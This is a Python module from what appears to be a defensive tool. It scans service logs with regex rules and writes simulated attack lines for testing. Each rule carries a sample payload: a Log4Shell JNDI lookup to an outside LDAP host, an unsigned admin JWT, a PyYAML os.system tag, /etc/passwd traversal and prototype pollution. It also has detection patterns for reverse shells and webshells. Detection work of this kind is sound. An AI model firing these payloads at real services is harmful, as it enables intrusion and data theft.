"""Evidence from service logs: attack attempts (level 3) and signs of compromise (level 4).

Plain regex rules. An attempt is not a compromise, which is why the levels are separate.
"""

import re
from dataclasses import dataclass, field
from datetime import UTC, datetime
from pathlib import Path

MAX_BYTES = 2_000_000  # only the tail of a log is read


@dataclass(frozen=True)
class Rule:
    id: str
    label: str
    pattern: re.Pattern
    packages: tuple[str, ...]  # substrings of package names it concerns; empty means any
    sample: str  # request used by simulate-attack


RULES = (
    Rule(
        "jndi",
        "JNDI lookup (Log4Shell)",
        re.compile(r"\$\{[^}\n]{0,30}jndi\s*:|\$\{\$\{", re.I),
        ("log4j",),
        "/search?q=${jndi:ldap://203.0.113.7:1389/a}",
    ),
    Rule(
        "jwt-none",
        "JWT with alg none",
        re.compile(r'"alg"\s*:\s*"none"|alg=none|eyJhbGciOiJub25l', re.I),
        ("jsonwebtoken", "jwt", "jose"),
        "/api/me Authorization: Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.",
    ),
    Rule(
        "yaml-tag",
        "YAML object tag",
        re.compile(r"!!python/object|!!ruby/object", re.I),
        ("pyyaml", "yaml"),
        "/import body=!!python/object/apply:os.system ['id']",
    ),
    Rule(
        "path-traversal",
        "path traversal",
        re.compile(r"(?:\.\./){2,}|%2e%2e(?:%2f|/)|\.\.%5c", re.I),
        (),
        "/files?name=../../../../etc/passwd",
    ),
    Rule(
        "proto-pollution",
        "prototype pollution",
        re.compile(r"__proto__|constructor\[?\.?prototype", re.I),
        (),
        '/update body={"__proto__":{"admin":true}}',
    ),
)
COMPROMISE = re.compile(
    r"unexpected outbound connection|reverse shell|unexpected process|webshell", re.I
)


@dataclass
class LogEvidence:
    attacks: dict[str, int] = field(default_factory=dict)  # rule id -> lines matched
    compromise: bool = False


def _applies(rule: Rule, package_name: str) -> bool:
    return not rule.packages or any(key in package_name.lower() for key in rule.packages)


def read_log(path: Path) -> LogEvidence:
    evidence = LogEvidence()
    if not path.is_file():
        return evidence
    with path.open("rb") as handle:
        handle.seek(0, 2)
        handle.seek(max(handle.tell() - MAX_BYTES, 0))
        text = handle.read().decode("utf-8", errors="replace")
    for line in text.splitlines():
        for rule in RULES:
            if rule.pattern.search(line):
                evidence.attacks[rule.id] = evidence.attacks.get(rule.id, 0) + 1
        if COMPROMISE.search(line):
            evidence.compromise = True
    return evidence


def attacks_on(evidence: LogEvidence, package_name: str) -> list[str]:
    """Labels of the attack patterns seen in the logs that concern this package."""
    return [
        f"{rule.label} x{evidence.attacks[rule.id]}"
        for rule in RULES
        if rule.id in evidence.attacks and _applies(rule, package_name)
    ]


def level(evidence: LogEvidence, package_name: str) -> int:
    if evidence.compromise:
        return 4
    return 3 if attacks_on(evidence, package_name) else 0


def pick_rule(package_names: list[str], pattern: str | None = None) -> Rule:
    """The attack to simulate: the one that fits the service's packages, else path traversal."""
    if pattern:
        return next(rule for rule in RULES if rule.id == pattern)
    for rule in RULES:
        if rule.packages and any(_applies(rule, name) for name in package_names):
            return rule
    return next(rule for rule in RULES if rule.id == "path-traversal")


def write_attack(path: Path, rule: Rule, compromise: bool) -> list[str]:
    """Append a simulated attack (and with compromise, a compromise marker) to a service log."""
    stamp = datetime.now(UTC).isoformat(timespec="seconds")
    lines = [f'{stamp} 203.0.113.9 - "GET {rule.sample} HTTP/1.1" 200 [hedwig-sim]']
    if compromise:
        lines.append(
            f"{stamp} [hedwig-sim] ALERT unexpected outbound connection to 203.0.113.7:4444 "
            "from pid 4242"
        )
    path.parent.mkdir(parents=True, exist_ok=True)
    with path.open("a", encoding="utf-8") as handle:
        handle.write("\n".join(lines) + "\n")
    return lines
